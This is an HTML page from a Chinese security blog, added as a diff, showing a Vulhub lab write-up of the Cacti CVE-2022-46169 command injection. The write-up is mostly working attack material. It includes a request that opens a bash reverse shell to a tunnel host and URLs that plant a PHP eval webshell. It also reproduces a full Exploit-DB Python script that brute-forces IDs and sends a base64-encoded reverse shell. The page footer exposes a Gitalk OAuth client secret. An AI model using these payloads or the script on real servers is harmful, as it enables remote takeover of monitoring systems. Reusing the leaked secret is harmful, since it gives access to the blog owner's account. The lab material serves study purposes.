@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>Vulhub-11.Cacti | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulhub-11.Cacti</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:22:17</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/Vulhub/">Vulhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>Cacti</p>
+<p>前台命令注入漏洞（CVE-2022-46169）</p>
+<p>Cacti是一个服务器监控与管理平台。基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具.在其1.2.17-1.2.22版本中存在一处命令注入漏洞，攻击者可以通过X-Forwarded-For请求头绕过服务端校验并在其中执行任意命令。</p>
+<p>由于remote_agent.php文件存在验证缺陷，未经身份验证的攻击者通过设置HTTP_开头变量的值为 Cacti的服务器主机名来实现身份验证绕过，之后控制get_nfilter_request_var()函数中的检索参数$poller_id，当poller_item设置为POLLER_ACTION_SCRIPT_PHP时，导致proc_open()函数被触发，最终实现在目标系统上任意命令执行。</p>
+<p>#漏洞payload</p>
+<p>remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;`&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;6.tcp.cpolar.cn&#x2F;13523 1&amp;&gt;0`</p>
+<p>X-Forwarded-For:127.0.0.1</p>
+<p>这个漏洞的利用需要Cacti应用中至少存在一个类似是`POLLER_ACTION_SCRIPT_PHP`的采集器。所以，我们在Cacti后台首页创建一个新的Graph：</p>
+<p><img src="/vulhub-11-cacti//1.png" alt="1"></p>
+<p><img src="/vulhub-11-cacti//2.png" alt="2"></p>
+<p>创建成功之后用payload即可反弹shell,或者写入webshell</p>
+<p><img src="/vulhub-11-cacti//3.png" alt="3"></p>
+<p><a target="_blank" rel="noopener" href="http://localhost:8080/remote_agent.php?action=polldata&local_data_ids%5C%5B0%5C%5D=6&host_id=1&poller_id=%5C%60touch+/tmp/success%5C%60">http://localhost:8080/remote_agent.php?action=polldata&amp;local_data_ids\[0\]=6&amp;host_id=1&amp;poller_id=\`touch+/tmp/success\`</a></p>
+<p><a target="_blank" rel="noopener" href="http://localhost:8080/remote_agent.php?action=polldata&local_data_ids%5C%5B0%5C%5D=6&host_id=1&poller_id=%5C%60echo%20%20%27%3C?php%20@eval($_REQUEST%5B%22cmd%22%5D);?%3E%27%20%3Eshell.php%5C%60">http://localhost:8080/remote_agent.php?action=polldata&amp;local_data_ids\[0\]=6&amp;host_id=1&amp;poller_id=\`echo%20%20&#39;%3C%3Fphp%20%40eval(%24_REQUEST%5B%22cmd%22%5D)%3B%3F%3E&#39;%20%3Eshell.php\`</a></p>
+<p>或者直接用POC链</p>
+<p># <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/51166">https://www.exploit-db.com/exploits/51166</a></p>
+<p># Exploit Title: Cacti v1.2.22 - Remote Command Execution (RCE)</p>
+<p># Exploit Author: Riadh BOUCHAHOUA</p>
+<p># Discovery Date: 2022-12-08</p>
+<p># Vendor Homepage: <a target="_blank" rel="noopener" href="https://www.cacti.net/">https://www.cacti.net/</a></p>
+<p># Software Links : <a target="_blank" rel="noopener" href="https://github.com/Cacti/cacti">https://github.com/Cacti/cacti</a></p>
+<p># Tested Version: 1.2.2x &lt;&#x3D; 1.2.22</p>
+<p># CVE: CVE-2022-46169</p>
+<p># Tested on OS: Debian 10&#x2F;11</p>
+<p># !&#x2F;usr&#x2F;bin&#x2F;env python3</p>
+<p>import random</p>
+<p>import sys</p>
+<p>import httpx, urllib</p>
+<p>class Exploit:</p>
+<p>    def __init__(self, url, proxy&#x3D;None, rs_host&#x3D;””, rs_port&#x3D;””):</p>
+<p>        self.url &#x3D; url</p>
+<p>        self.session &#x3D; httpx.Client(headers&#x3D;{“User-Agent”: self.random_user_agent()}, verify&#x3D;False, proxies&#x3D;proxy)</p>
+<p>        self.rs_host &#x3D; rs_host</p>
+<p>        self.rs_port &#x3D; rs_port</p>
+<p>    def exploit(self):</p>
+<p>        # cacti local ip from the url for the X-Forwarded-For header</p>
+<p>        # local_cacti_ip  &#x3D; self.url.split(“&#x2F;&#x2F;“)[1].split(“&#x2F;“)[0]</p>
+<p>        local_cacti_ip &#x3D; ‘127.0.0.1’</p>
+<p>        headers &#x3D; {</p>
+<p>            ‘X-Forwarded-For’: f’{local_cacti_ip}’</p>
+<p>        }</p>
+<p>        revshell &#x3D; f”bash -c ‘exec bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;{self.rs_host}&#x2F;{self.rs_port} &lt;&amp;1’”</p>
+<p>        import base64</p>
+<p>        b64_revshell &#x3D; base64.b64encode(revshell.encode()).decode()</p>
+<p>        payload &#x3D; f”;echo {b64_revshell} | base64 -d | bash -“</p>
+<p>        payload &#x3D; urllib.parse.quote(payload)</p>
+<p>        urls &#x3D; []</p>
+<p>        # Adjust the range to fit your needs ( wider the range, longer the script will take to run the more success you will have achieving a reverse shell)</p>
+<p>        for host_id in range(1, 100):</p>
+<p>            for local_data_ids in range(1, 100):</p>
+<p>                urls.append(</p>
+<p>                    f”{self.url}&#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[]&#x3D;{local_data_ids}&amp;host_id&#x3D;{host_id}&amp;poller_id&#x3D;1{payload}”)</p>
+<p>        for url in urls:</p>
+<p>            try:</p>
+<p>                print(“[*]try: {}”.format(urllib.parse.unquote(url)))</p>
+<p>                r &#x3D; self.session.get(url, headers&#x3D;headers)</p>
+<p>                print(f”{r.status_code} - {r.text}”)</p>
+<p>            except Exception as e:</p>
+<p>                print(e)</p>
+<p>                sys.exit()</p>
+<p>        pass</p>
+<p>    def random_user_agent(self):</p>
+<p>        ua_list &#x3D; [</p>
+<p>            “Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;91.0.4472.124 Safari&#x2F;537.36”,</p>
+<p>            “Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko&#x2F;20100101 Firefox&#x2F;89.0”,</p>
+<p>        ]</p>
+<p>        return random.choice(ua_list)</p>
+<p>def parse_args():</p>
+<p>    import argparse</p>
+<p>    argparser &#x3D; argparse.ArgumentParser()</p>
+<p>    argparser.add_argument(“-u”, “–url”, help&#x3D;”Target URL (e.g. <a target="_blank" rel="noopener" href="http://192.168.1.100/cacti">http://192.168.1.100/cacti</a>)”)</p>
+<p>    argparser.add_argument(“-p”, “–remote_port”, help&#x3D;”reverse shell port to connect to”, required&#x3D;True)</p>
+<p>    argparser.add_argument(“-i”, “–remote_ip”, help&#x3D;”reverse shell IP to connect to”, required&#x3D;True)</p>
+<p>    return argparser.parse_args()</p>
+<p>def main() -&gt; None:</p>
+<p>    # Open a nc listener (rs_host+rs_port) and run the script against a CACTI server with its LOCAL IP URL</p>
+<p>    args &#x3D; parse_args()</p>
+<p>    e &#x3D; Exploit(args.url, rs_host&#x3D;args.remote_ip, rs_port&#x3D;args.remote_port)</p>
+<p>    e.exploit()</p>
+<p>if __name__ &#x3D;&#x3D; “__main__“:</p>
+<p>    main()</p>
+<p>python Cacti.py -u http:&#x2F;&#x2F;靶机ip:8080 -i 接收shell的ip -p 15141</p>
+<p>这就直接反弹shell了</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E6%89%93%E9%9D%B6/"># 打靶</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../vulhub-12-celery/">Vulhub-12.Celery</a>
+            
+            
+            <a class="next" rel="next" href="../vulhub-10-bashshellshock/">Vulhub-10.BashShellshock</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
